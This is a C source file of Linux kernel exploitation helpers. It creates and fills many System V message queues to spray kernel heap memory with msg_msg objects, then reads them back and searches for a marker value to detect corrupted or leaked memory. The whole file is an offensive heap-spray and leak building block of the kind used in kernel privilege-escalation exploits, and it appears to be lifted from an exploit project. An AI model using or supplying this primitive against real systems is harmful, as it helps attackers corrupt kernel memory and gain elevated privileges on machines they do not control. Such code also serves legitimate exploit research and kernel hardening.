#include "msg.h"

#define MSG_COPY 040000

err_t pre_spray_msg(int64_t *store, uint32_t amount)
{
    int32_t register ret = 0;

    for (uint32_t i = 0; i < amount; i++) {
        ret = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
        IF_ERR(ret) {
            perror("spray_msg:msgsnd");
            return ERR;
        }
        store[i] = ret;
    }
    return SUCC;
}

err_t spray_msg(uint64_t *store, uint32_t amount, char *data, uint64_t size)
{
    int32_t ret = 0;
    struct msgb* msg = (struct msgb*)data;

    for (uint32_t i = 0; i < amount; i++) {
        msg->mtype = i + 1;
        ret = msgsnd(store[i], msg, size, 0);
        IF_ERR(ret) {
            perror("spray_msg:msgsnd");
            return ERR;
        }
    }

    return SUCC;
}

err_t leak_msg(uint64_t needle, uint64_t *store, uint32_t amount, char *data, uint64_t size)
{
    uint64_t *leak = malloc(size * sizeof(uint64_t));
    IF_ERR_PTR(leak) {
        perror("leak_msg:malloc");
        return ERR;
    }
    struct msgb* msg = (struct msgb*)leak;
    err_t ret_err = ERR;

    for (int i = 0; i < amount; i++) {
        IF_ERR(msgrcv(store[i], msg, size, i + 1, 0)) {
            perror("leak_msg:msgrcv");
            goto out;
        }
        for (int j = 0; j < (size / sizeof(uint64_t)); j++) {
            if (leak[j] == needle) {
                memcpy(data, leak, size);
                ret_err = SUCC;
                goto out;
            }
        }
    }
out:
    free(leak);
    return ret_err;
}